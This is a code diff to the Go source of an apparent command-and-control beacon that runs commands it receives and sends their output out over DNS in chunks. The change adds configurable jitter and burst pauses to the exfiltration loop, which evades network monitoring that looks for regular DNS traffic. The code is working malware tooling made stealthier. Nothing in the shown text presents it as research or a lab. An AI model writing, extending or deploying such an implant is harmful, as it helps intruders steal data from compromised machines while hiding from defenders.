@@ -110,7 +110,7 @@ func (b *Beacon) executeCommand(command string) string {
 	return string(output)
 }
 
-// exfiltrateResult sends command results back via DNS using two-phase protocol
+// exfiltrateResult sends command results back via DNS using two-phase protocol with burst-based jitter
 func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	maxCmd := b.client.config.MaxCommandLength
 	if maxCmd <= 64 {
@@ -143,10 +143,27 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 		return fmt.Errorf("failed to send result metadata: %v", err)
 	}
 
-	// Small delay before starting chunks
-	time.Sleep(2 * time.Second)
+	// Get jitter configuration
+	jitterMin := b.client.config.ExfilJitterMinMs
+	jitterMax := b.client.config.ExfilJitterMaxMs
+	chunksPerBurst := b.client.config.ExfilChunksPerBurst
+	burstPause := b.client.config.ExfilBurstPauseMs
 
-	// Phase 2: Send the actual data chunks
+	// Defaults if not configured
+	if jitterMin <= 0 {
+		jitterMin = 1000 // 1 second
+	}
+	if jitterMax < jitterMin {
+		jitterMax = jitterMin + 1000
+	}
+	if chunksPerBurst <= 0 {
+		chunksPerBurst = 10
+	}
+	if burstPause <= 0 {
+		burstPause = 5000 // 5 seconds
+	}
+
+	// Phase 2: Send the actual data chunks with burst-based jitter
 	for i := 0; i < totalChunks; i++ {
 		start := i * safeRawChunk
 		end := start + safeRawChunk
@@ -161,8 +178,16 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 			return fmt.Errorf("failed to send data chunk %d/%d: %v", i+1, totalChunks, err)
 		}
 
-		// Small delay between chunks
-		time.Sleep(time.Duration(rand.Intn(2)+1) * time.Second)
+		// Apply delay after each burst
+		if (i+1)%chunksPerBurst == 0 && i+1 < totalChunks {
+			// Burst complete - apply jitter + burst pause
+			jitterDelay := jitterMin + rand.Intn(jitterMax-jitterMin+1)
+			totalDelay := time.Duration(jitterDelay+burstPause) * time.Millisecond
+			time.Sleep(totalDelay)
+		} else if i+1 < totalChunks {
+			// Within burst - small delay for DNS rate limiting
+			time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
+		}
 	}
 
 	return nil
